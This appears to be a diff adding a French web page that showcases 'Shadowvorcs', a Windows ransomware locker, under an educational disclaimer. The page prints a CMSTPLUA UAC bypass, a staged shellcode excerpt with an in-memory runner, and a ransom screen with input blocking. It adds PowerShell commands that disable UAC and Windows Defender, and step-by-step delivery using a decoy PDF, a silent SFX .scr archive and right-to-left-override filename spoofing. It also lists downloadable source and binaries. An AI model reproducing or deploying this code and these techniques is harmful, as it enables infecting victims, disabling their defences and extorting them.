+                        <div class="tool-icon">04</div>
+                        <div>
+                            <div class="tool-name">Fonction de Bypass UAC</div>
+                            <div class="tool-desc">Contournement de l'UAC — exécution admin sans fenêtre de confirmation</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="command-block">
+                            <div class="command-label">Code — BypassUAC_CMSTPLUA()</div>
+                            <code class="command-code">bool BypassUAC_CMSTPLUA(const wchar_t* command, const wchar_t* parameters) {
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr)) return false;
+
+    ICMLuaUtil* pLuaUtil = NULL;
+    hr = CoCreateInstance(CLSID_CMSTPLUA, NULL, CLSCTX_LOCAL_SERVER,
+                          IID_ICMLuaUtil, (void**)&pLuaUtil);
+    if (FAILED(hr) || !pLuaUtil) {
+        CoUninitialize();
+        return false;
+    }
+
+    hr = pLuaUtil->lpVtbl->ShellExec(pLuaUtil, command, parameters,
+                                      NULL, NULL, SW_SHOWNORMAL);
+    pLuaUtil->lpVtbl->Release(pLuaUtil);
+    CoUninitialize();
+
+    return SUCCEEDED(hr);
+}</code>
+                        </div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">CoInitializeEx()</td><td class="opt-desc">Initialise la bibliothèque COM en mode apartment-threaded</td></tr>
+                            <tr><td class="opt-flag">CoCreateInstance()</td><td class="opt-desc">Crée une instance de l'objet CMSTPLUA avec élévation locale</td></tr>
+                            <tr><td class="opt-flag">ShellExec()</td><td class="opt-desc">Exécute une commande avec privilèges admin sans invite UAC</td></tr>
+                            <tr><td class="opt-flag">Release()</td><td class="opt-desc">Libère les ressources COM allouées</td></tr>
+                            <tr><td class="opt-flag">CoUninitialize()</td><td class="opt-desc">Finalise la session COM</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- BLOC SHELLCODE -->
+        <section id="bloc-shellcode" class="section">
+            <h2 class="section-title">BLOCS 05–06 — Shellcode & Exécution</h2>
+            <div class="tools-grid">
+
+                <div class="tool-card" id="bloc05">
+                    <div class="tool-header">
+                        <div class="tool-icon">05</div>
+                        <div>
+                            <div class="tool-name">Shellcode Malveillant</div>
+                            <div class="tool-desc">Code machine binaire injecté et exécuté directement en mémoire</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="command-block">
+                            <div class="command-label">Code — Shellcode (extrait)</div>
+                            <code class="command-code">unsigned char shellcode[] =
+"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+...
+"\xff\xd5";</code>
+                        </div>
+                        <p style="font-size: 0.8rem; color: var(--text-dim); margin-top: 10px;">Ce shellcode contient du code machine binaire conçu pour être un <strong style="color: var(--neon-red-glow);">staged payload</strong> — il peut télécharger des charges utiles supplémentaires, établir des connexions distantes ou exfiltrer des données.</p>
+                    </div>
+                </div>
+
+                <div class="tool-card" id="bloc06">
+                    <div class="tool-header">
+                        <div class="tool-icon">06</div>
+                        <div>
+                            <div class="tool-name">Exécution du Shellcode</div>
+                            <div class="tool-desc">Allocation mémoire exécutable et lancement du payload en RAM</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="command-block">
+                            <div class="command-label">Code — executeShellcode()</div>
+                            <code class="command-code">void executeShellcode() {
+    void* exec = VirtualAlloc(0, sizeof(shellcode),
+                              MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, shellcode, sizeof(shellcode));
+    ((void(*)())exec)();
+}</code>
+                        </div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">VirtualAlloc()</td><td class="opt-desc">Alloue une zone mémoire avec permissions d'exécution (RWX)</td></tr>
+                            <tr><td class="opt-flag">memcpy()</td><td class="opt-desc">Copie le shellcode dans la zone mémoire allouée</td></tr>
+                            <tr><td class="opt-flag">((void(*)())exec)()</td><td class="opt-desc">Cast en pointeur de fonction et exécute le code en mémoire</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- BLOC RANSOMWARE -->
+        <section id="bloc-ransomware" class="section">
+            <h2 class="section-title">BLOCS 07–08 — Ransomware & Blocage</h2>
+            <div class="tools-grid">
+
+                <div class="tool-card" id="bloc07">
+                    <div class="tool-header">
+                        <div class="tool-icon">07</div>
+                        <div>
+                            <div class="tool-name">Affichage Ransomware</div>
+                            <div class="tool-desc">Effets visuels d'extorsion — Matrix + Glitch (optionnel, ~40% du code fourni)</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="warning-box">
+                            ⚠️ Seulement ~40% du code de ce bloc est fourni pour des raisons de sécurité.
+                        </div>
+                        <div class="command-block">
+                            <div class="command-label">Code — Effet Matrix</div>
+                            <code class="command-code">void displayMatrixEffect() {
+    std::string cmd = "python -c \"import random, time, sys; "
+        "chars = '0123456789abcdefABCDEF!@#$%^&*()'; "
+        "while True: sys.stdout.write(random.choice(chars)); "
+        "sys.stdout.flush(); time.sleep(0.05)\"";
+    std::thread matrixThread([cmd]() {
+        std::system(cmd.c_str());
+    });
+    matrixThread.detach();
+}</code>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-label">Code — Effet Glitch / Message de Rançon</div>
+                            <code class="command-code">void displayGlitchEffect() {
+    std::ostringstream oss;
+    oss &lt;&lt; "RANCON RANSOM!!!\n\n"
+        "VOTRE SYSTEME EST ENLEVE!\n\n"
+        "PASSEZ A LA PAGE: https://imortel.fr\n\n"
+        "PRESSIONEZ UNE TASTE POUR DECOUPER!\n\n"
+        "GLITCH & MATRICE EN COURS...\n";
+    std::string text = oss.str();
+    for (int i = 0; i &lt; 100; ++i) {
+        std::cout &lt;&lt; "\r" &lt;&lt; text &lt;&lt; std::flush;
+        std::this_thread::sleep_for(
+            std::chrono::milliseconds(100));
+    }
+}</code>
+                        </div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">Effet Matrix</td><td class="opt-desc">Défilement continu de caractères aléatoires — animation permanente</td></tr>
+                            <tr><td class="opt-flag">Effet Glitch</td><td class="opt-desc">Message de rançon clignotant avec URL de paiement</td></tr>
+                            <tr><td class="opt-flag">Parallèle</td><td class="opt-desc">Les deux effets s'exécutent en threads séparés simultanément</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="tool-card" id="bloc08">
+                    <div class="tool-header">
+                        <div class="tool-icon">08</div>
+                        <div>
+                            <div class="tool-name">Blocage des Entrées Clavier</div>
+                            <div class="tool-desc">Hook clavier — boucle infinie interceptant toutes les frappes</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="command-block">
+                            <div class="command-label">Code — blockInput()</div>
+                            <code class="command-code">void blockInput() {
+    while (true) {
+        if (_kbhit()) _getch();
+        std::this_thread::sleep_for(
+            std::chrono::milliseconds(100));
+    }
+}</code>
+                        </div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">_kbhit()</td><td class="opt-desc">Vérifie si une touche a été pressée</td></tr>
+                            <tr><td class="opt-flag">_getch()</td><td class="opt-desc">Capture et supprime la frappe — empêche toute interaction</td></tr>
+                            <tr><td class="opt-flag">while (true)</td><td class="opt-desc">Boucle infinie — blocage permanent jusqu'au kill du processus</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- BLOC SYSTÈME -->
+        <section id="bloc-systeme" class="section">
+            <h2 class="section-title">BLOC 09 — Prise de Contrôle Système</h2>
+            <div class="tools-grid">
+
+                <div class="tool-card full-width" id="bloc09">
+                    <div class="tool-header">
+                        <div class="tool-icon">09</div>
+                        <div>
+                            <div class="tool-name">Prise de Contrôle Système</div>
+                            <div class="tool-desc">Élévation de privilèges, désactivation des défenses et exécution de commandes</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="command-block">
+                            <div class="command-label">Code — openBrowser()</div>
+                            <code class="command-code">void openBrowser() {
+    ShellExecuteW(NULL, L"open", L"https://imortel.fr",
+                  NULL, NULL, SW_SHOWNORMAL);
+}</code>
+                        </div>
+
+                        <div class="command-block">
+                            <div class="command-label">Code — openPowerShellWithCommands()</div>
+                            <code class="command-code">void openPowerShellWithCommands() {
+    const wchar_t* command = L"powershell.exe";
+    const wchar_t* params = L"-NoExit -Command \""
+        "Write-Host 'Mode administrateur actif' -ForegroundColor Green; "
+        "Write-Host '=== Désactivation UAC ===' -ForegroundColor Yellow; "
+        "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\"
+        "CurrentVersion\\Policies\\System' "
+        "/v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f; "
+        "Write-Host '=== Désactivation Defender ===' -ForegroundColor Yellow; "
+        "Set-MpPreference -DisableRealtimeMonitoring $true; "
+        "Write-Host '=== Informations réseau ===' -ForegroundColor Yellow; "
+        "ipconfig /all; "
+        "Write-Host 'Toutes les commandes exécutées.' -ForegroundColor Green\"";
+
+    if (BypassUAC_CMSTPLUA(command, params)) {
+        return;
+    }
+    ShellExecuteW(NULL, L"runas", L"powershell.exe",
+                  params, NULL, SW_SHOWNORMAL);
+}</code>
+                        </div>
+
+                        <div class="category-header">Chaîne d'Exécution</div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">1. openBrowser()</td><td class="opt-desc">Ouverture forcée du navigateur vers https://imortel.fr</td></tr>
+                            <tr><td class="opt-flag">2. BypassUAC_CMSTPLUA()</td><td class="opt-desc">Tentative de bypass UAC via COM — exécution admin silencieuse</td></tr>
+                            <tr><td class="opt-flag">3. Fallback "runas"</td><td class="opt-desc">Si le bypass échoue, utilise ShellExecuteW avec "runas" (invite admin)</td></tr>
+                        </table>
+
+                        <div class="category-header">Commandes PowerShell Exécutées</div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">reg add ... /d 0 /f</td><td class="opt-desc">Désactivation de l'UAC — ConsentPromptBehaviorAdmin à 0</td></tr>
+                            <tr><td class="opt-flag">Set-MpPreference</td><td class="opt-desc">Désactivation de la protection temps réel de Windows Defender</td></tr>
+                            <tr><td class="opt-flag">ipconfig /all</td><td class="opt-desc">Cartographie réseau de la victime (DNS, DHCP, passerelle, MAC)</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- OBFUSCATION RLO -->
+        <section id="obfuscation" class="section">
+            <h2 class="section-title">Obfuscation RLO & Emballage SFX</h2>
+            <div class="tools-grid">
+
+                <div class="tool-card full-width" id="rlo-technique">
+                    <div class="tool-header">
+                        <div class="tool-icon">RLO</div>
+                        <div>
+                            <div class="tool-name">Technique d'Obfuscation RLO</div>
+                            <div class="tool-desc">Stéganographie du nom de fichier avec le caractère Right-to-Left Override (U+202E)</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="category-header">Étape 1 — Créer le fichier batch de lancement</div>
+                        <p style="font-size: 0.8rem; color: var(--text-dim); margin: 10px 0;">Créer un fichier <strong style="color: var(--neon-red-glow);">imortel.bat</strong> contenant :</p>
+                        <div class="command-block">
+                            <div class="command-label">Contenu de imortel.bat</div>
+                            <code class="command-code">start "" "imortel.pdf"
+start "" "imortel.exe"</code>
+                        </div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">Ligne 1</td><td class="opt-desc">Ouvre le PDF/PNG leurre pour tromper l'utilisateur</td></tr>
+                            <tr><td class="opt-flag">Ligne 2</td><td class="opt-desc">Lance silencieusement l'exécutable malveillant en arrière-plan</td></tr>
+                        </table>
+
+                        <div class="category-header">Étape 2 — Création de l'archive SFX auto-extractible</div>
+                        <p style="font-size: 0.8rem; color: var(--text-dim); margin: 10px 0;">Sélectionner les 3 fichiers nécessaires :</p>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">imortel.pdf</td><td class="opt-desc">Leurre stéganographique (ou .png)</td></tr>
+                            <tr><td class="opt-flag">imortel.exe</td><td class="opt-desc">Le malware réel</td></tr>
+                            <tr><td class="opt-flag">imortel.bat</td><td class="opt-desc">Le script de lancement</td></tr>
+                        </table>
+                        <div class="command-block">
+                            <div class="command-label">Configuration archive SFX (WinRAR)</div>
+                            <code class="command-code">Nom de l'archive : Imortel.scr
+✅ Cocher : "Créer une archive SFX"
+
+Onglet "Avancé" → "Options SFX..." :
+  → Exécuter après extraction : imortel.bat
+  → Modes : "Masquer tout" (Silent mode)
+  → Mise à jour : "Écraser tous les fichiers"
+  → Texte et icône : sélectionner Imortel.ico</code>
+                        </div>
+                        <p style="font-size: 0.8rem; color: var(--text-dim); margin: 10px 0;">L'extension <code style="color: var(--neon-red-glow);">.scr</code> est cruciale — elle s'exécute comme un .exe mais paraît moins suspecte.</p>
+
+                        <div class="category-header">Étape 3 — Obfuscation du nom avec le caractère RLO</div>
+                        <table class="options-table">
+                            <tr><td class="opt-flag">1.</td><td class="opt-desc">Renommer le fichier Imortel.scr en Shadowvofdp.scr</td></tr>
+                            <tr><td class="opt-flag">2.</td><td class="opt-desc">Insérer le caractère RLO (U+202E) juste avant le "f" de "fdp"</td></tr>
+                            <tr><td class="opt-flag">3.</td><td class="opt-desc">Le nom s'affiche alors comme : <strong style="color: var(--neon-red);">Shadowvorcs.pdf</strong></td></tr>
+                            <tr><td class="opt-flag">4.</td><td class="opt-desc">Obtenir le RLO depuis unicode-explorer.com/c/202E</td></tr>
+                        </table>
+                        <p style="font-size: 0.8rem; color: var(--text-dim); margin-top: 10px;">Le caractère <strong style="color: var(--neon-red-glow);">Right-to-Left Override</strong> inverse l'ordre d'affichage des caractères suivants. Ainsi <code style="color: var(--neon-red-glow);">Shadowvo[RLO]fdp.scr</code> s'affiche comme <code style="color: var(--neon-red-glow);">Shadowvorcs.pdf</code> — la vraie extension .scr est masquée.</p>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- BIBLIOTHÈQUES -->
+        <section id="bibliotheques" class="section">
+            <h2 class="section-title">Bibliothèques Windows Utilisées</h2>
+            <div class="tools-grid">
+
+                <div class="tool-card full-width" id="win-libs">
+                    <div class="tool-header">
+                        <div class="tool-icon">LIB</div>
+                        <div>
+                            <div class="tool-name">Bibliothèques Win32</div>
+                            <div class="tool-desc">DLL système Windows utilisées par Shadowvorcs</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <table class="options-table">
+                            <tr>
+                                <th>Bibliothèque</th>
+                                <th>Flag</th>
+                                <th>Rôle Principal</th>
+                            </tr>
+                            <tr><td class="opt-flag">User32.dll</td><td class="opt-desc">-luser32</td><td class="opt-desc">Fenêtres, messages, UI, clavier, souris</td></tr>
+                            <tr><td class="opt-flag">Gdi32.dll</td><td class="opt-desc">-lgdi32</td><td class="opt-desc">Rendu graphique GDI, formes, texte, bitmap</td></tr>
+                            <tr><td class="opt-flag">Shell32.dll</td><td class="opt-desc">-lshell32</td><td class="opt-desc">ShellExecute, gestion fichiers, icônes</td></tr>
+                            <tr><td class="opt-flag">Winmm.dll</td><td class="opt-desc">-lwinmm</td><td class="opt-desc">Son, timers multimédias</td></tr>
+                            <tr><td class="opt-flag">Ole32.dll</td><td class="opt-desc">-lole32</td><td class="opt-desc">COM, interfaces objets OLE</td></tr>
+                            <tr><td class="opt-flag">OleAut32.dll</td><td class="opt-desc">-loleaut32</td><td class="opt-desc">Automatisation OLE, VARIANT, BSTR</td></tr>
+                            <tr><td class="opt-flag">TaskSchd.dll</td><td class="opt-desc">-ltaskschd</td><td class="opt-desc">Planificateur Windows Task Scheduler (v2 COM)</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- DOWNLOADS -->
+                <div class="tool-card full-width" id="downloads">
+                    <div class="tool-header">
+                        <div class="tool-icon">DL</div>
+                        <div>
+                            <div class="tool-name">Téléchargements</div>
+                            <div class="tool-desc">Fichiers disponibles au téléchargement sur GitHub</div>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <div class="warning-box">
+                            ⚠️ L'exécutable est fourni à titre éducatif. Toujours exécuter dans un environnement isolé (VM, sandbox).
+                        </div>
+                        <table class="options-table">
+                            <tr>
+                                <th>Fichier</th>
+                                <th>Type</th>
+                                <th>Description</th>
+                            </tr>
+                            <tr><td class="opt-flag">imortel.cpp</td><td class="opt-desc">SOURCE</td><td class="opt-desc">Code source complet C++ Win32</td></tr>
+                            <tr><td class="opt-flag">imortel.exe</td><td class="opt-desc">BINARY</td><td class="opt-desc">Exécutable Windows compilé</td></tr>
+                            <tr><td class="opt-flag">imortel.zip</td><td class="opt-desc">ARCHIVE</td><td class="opt-desc">Projet complet empaqueté</td></tr>
+                            <tr><td class="opt-flag">imortel.bat</td><td class="opt-desc">SCRIPT</td><td class="opt-desc">Script batch de lancement (leurre + exe)</td></tr>
+                            <tr><td class="opt-flag">imortel.pdf</td><td class="opt-desc">LEURRE</td><td class="opt-desc">Document PDF de stéganographie</td></tr>
+                            <tr><td class="opt-flag">Imortel.ico</td><td class="opt-desc">ICÔNE</td><td class="opt-desc">Icône d'apparence légitime pour SFX</td></tr>
+                            <tr><td class="opt-flag">imortel.png</td><td class="opt-desc">IMAGE</td><td class="opt-desc">Screenshot de démonstration</td></tr>
+                        </table>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- TERMINAL WIDGET -->
+        <section id="terminal" class="section">
+            <h2 class="section-title">Système Actif</h2>
+            <div class="tools-grid">
+                <div class="tool-card full-width" style="padding: 0; border: none; background: transparent;">
+                    <div style="max-width: 900px; margin: 0 auto;">
+
+                        <style>
+                            #sv-root {
+                                background: #000;
+                                border: 1px solid var(--neon-red-dim);
+                                border-radius: 4px;
+                                padding: 28px 20px 24px;
+                                font-family: 'Share Tech Mono', 'Courier New', monospace;
+                                overflow: hidden;
+                                position: relative;
+                                box-shadow: 0 0 40px rgba(255, 10, 10, 0.08), inset 0 0 60px rgba(255, 10, 10, 0.03);
+                            }
+                            #sv-root::before {
+                                content: '';
+                                position: absolute;
+                                top: 0; left: 0; right: 0;
+                                height: 2px;
+                                background: var(--neon-red);
+                                animation: scanline 3s linear infinite;
+                            }
+                            @keyframes scanline {
+                                0%   { top: 0; opacity: 1; }
+                                100% { top: 100%; opacity: 0.2; }
+                            }
+                            .sv-topbar {
+                                display: flex;
+                                align-items: center;
+                                gap: 8px;
+                                margin-bottom: 20px;
+                                border-bottom: 1px solid #1a1a1a;
+                                padding-bottom: 10px;
+                            }
+                            .sv-dot { width: 10px; height: 10px; border-radius: 50%; }
+                            .sv-dot-r { background: var(--neon-red); }
+                            .sv-dot-y { background: #444; }
+                            .sv-dot-g { background: #222; }
+                            .sv-topbar-title {
+                                margin-left: auto;
+                                color: #555;
+                                font-size: 11px;
+                                letter-spacing: 2px;
+                            }
+                            #sv-ascii {
+                                color: var(--neon-red);
+                                font-size: clamp(5px, 1.4vw, 11px);
+                                line-height: 1.25;
+                                white-space: pre;
+                                text-align: center;
+                                opacity: 0;
+                                animation: svFadeIn 0.5s 0.8s forwards;
+                                text-shadow: 0 0 8px var(--neon-red-dark);
+                                overflow-x: auto;
+                            }
+                            @keyframes svFadeIn { to { opacity: 1; } }
+                            #sv-tagline {
+                                text-align: center;
+                                color: var(--neon-red-dim);
+                                font-size: 11px;
+                                letter-spacing: 4px;
+                                margin-top: 16px;
+                                opacity: 0;
+                                animation: svFadeIn 0.5s 1.6s forwards;
+                            }
+                            #sv-status {
+                                display: flex;
+                                justify-content: space-between;
+                                flex-wrap: wrap;
+                                gap: 8px;
+                                margin-top: 18px;
+                                padding-top: 12px;
+                                border-top: 1px solid #1a1a1a;
+                                opacity: 0;
+                                animation: svFadeIn 0.5s 2s forwards;
+                            }
+                            .sv-stat { font-size: 10px; color: #444; letter-spacing: 1px; }
+                            .sv-stat span { color: var(--neon-red); }
+                            #sv-cursor {
+                                display: inline-block;
+                                width: 8px;
+                                height: 14px;
+                                background: var(--neon-red);
+                                vertical-align: middle;
+                                animation: svBlink 1s step-end infinite;
+                                margin-left: 4px;
+                            }
+                            @keyframes svBlink { 50% { opacity: 0; } }
+                            #sv-typewriter {
+                                color: var(--neon-red);
+                                font-size: 12px;
+                                letter-spacing: 1px;
+                                min-height: 18px;
+                                margin-top: 14px;
+                                text-align: center;
+                            }
+                            #sv-progress {
+                                height: 2px;
+                                background: #111;
+                                margin-top: 14px;
+                                border-radius: 1px;
+                                overflow: hidden;
+                            }
+                            #sv-bar {
+                                height: 100%;
+                                width: 0%;
+                                background: var(--neon-red);
+                                transition: width 0.05s linear;
+                            }
+                            .sv-grid {
+                                display: grid;
+                                grid-template-columns: repeat(3, 1fr);
+                                gap: 8px;
+                                margin-top: 14px;
+                                opacity: 0;
+                                animation: svFadeIn 0.5s 2.4s forwards;
+                            }
+                            .sv-cell {
+                                border: 1px solid #1a1a1a;
+                                padding: 8px 6px;
+                                text-align: center;
+                                border-radius: 2px;
+                            }
+                            .sv-cell-label { font-size: 9px; color: #444; letter-spacing: 2px; display: block; }
+                            .sv-cell-value { font-size: 13px; color: var(--neon-red); display: block; margin-top: 2px; }
+                        </style>
+
+                        <div id="sv-root">
+                            <div class="sv-topbar">
+                                <div class="sv-dot sv-dot-r"></div>
+                                <div class="sv-dot sv-dot-y"></div>
+                                <div class="sv-dot sv-dot-g"></div>
+                                <div class="sv-topbar-title">TERMINAL // IMORTEL OS v1.0</div>
+                            </div>
+
+                            <pre id="sv-ascii">
+ ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗██╗   ██╗ ██████╗ ██████╗  ██████╗███████╗
+ ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║██║   ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝
+ ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║██║   ██║██║   ██║██████╔╝██║     ███████╗
+ ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║╚██╗ ██╔╝██║   ██║██╔══██╗██║     ╚════██║
+ ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝ ╚████╔╝ ╚██████╔╝██║  ██║╚██████╗███████║
+ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝   ╚═══╝   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝</pre>
+
+                            <div id="sv-tagline">· S Y S T E M    A C T I V E  //  S I G N A L    D É T E C T É ·</div>
+
+                            <div id="sv-progress"><div id="sv-bar"></div></div>
+                            <div id="sv-typewriter"><span id="sv-tw-text"></span><span id="sv-cursor"></span></div>
+
+                            <div class="sv-grid">
+                                <div class="sv-cell">
+                                    <span class="sv-cell-label">STATUT</span>
+                                    <span class="sv-cell-value" id="sv-stat-status">ACTIF</span>
+                                </div>
+                                <div class="sv-cell">
+                                    <span class="sv-cell-label">OPÉRATEUR</span>
+                                    <span class="sv-cell-value">IMORTEL</span>
+                                </div>
+                                <div class="sv-cell">
+                                    <span class="sv-cell-label">SIGNAL</span>
+                                    <span class="sv-cell-value" id="sv-stat-signal">--</span>
+                                </div>
+                            </div>
+
+                            <div id="sv-status">
+                                <div class="sv-stat">SYS &gt; <span>ONLINE</span></div>
+                                <div class="sv-stat">AUTH &gt; <span>GRANTED</span></div>
+                                <div class="sv-stat">TRACE &gt; <span>EFFACÉE</span></div>
+                                <div class="sv-stat">LOC &gt; <span>OÏMIAKON, RU</span></div>
+                            </div>
+                        </div>
+
+                        <script>
+                        (function() {
+                            const bar = document.getElementById('sv-bar');
+                            const twText = document.getElementById('sv-tw-text');
+                            const sigEl = document.getElementById('sv-stat-signal');
+
+                            const lines = [
+                                '> INITIALISATION DU SYSTÈME...',
+                                '> CHARGEMENT DU NOYAU IMORTEL...',
+                                '> AUTHENTIFICATION : SUCCÈS',
+                                '> CONNEXION ÉTABLIE — BIENVENUE',
+                                '> SHADOWVORCS // SIGNAL ACTIF_',
+                            ];
+
+                            let pct = 0;
+                            const barInt = setInterval(() => {
+                                pct += 2;
+                                bar.style.width = Math.min(pct, 100) + '%';
+                                if (pct >= 100) clearInterval(barInt);
+                            }, 30);
+
+                            let li = 0, ci = 0;
+                            function type() {
+                                if (li >= lines.length) {
+                                    twText.textContent = lines[lines.length - 1];
+                                    return;
+                                }
+                                const line = lines[li];
+                                if (ci <= line.length) {
+                                    twText.textContent = line.slice(0, ci);
+                                    ci++;
+                                    setTimeout(type, 38);
+                                } else {
+                                    li++;
+                                    ci = 0;
+                                    setTimeout(type, 420);
+                                }
+                            }
+                            setTimeout(type, 900);
+
+                            const sigs = ['██████', '█████░', '████░░', '██████', '███░░░', '██████'];
+                            let si = 0;
+                            setInterval(() => {
+                                sigEl.textContent = sigs[si % sigs.length];
+                                si++;
+                            }, 700);
+                        })();
+                        </script>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer>
+        <p class="footer-text">
+            SHADOWVORCS // Ransomware Locker Windows — Analyse Éducative<br>
+            <a href="https://github.com/imortel-cyber/IMORTEL-Shadowvorcs" class="footer-link" target="_blank">GitHub — IMORTEL-Shadowvorcs</a> // 
+            <a href="https://imortel.fr" class="footer-link" target="_blank">imortel.fr</a> //
+            <a href="https://www.linkedin.com/in/imortel/" class="footer-link" target="_blank">LinkedIn Marwan</a><br><br>
+            ⚠️ Projet strictement éducatif — Utilisation uniquement en environnement lab sécurisé et isolé.<br>
+            Vous êtes entièrement responsable de l'utilisation de ce code.<br>
+            © 2025-2026 By Marwan - Imortel // Oïmiakon<br><br>
+            <em style="color: var(--neon-red-dim);">"The quieter you become, the more you can hear."</em>
+        </p>
+    </footer>
+</body>
+</html>
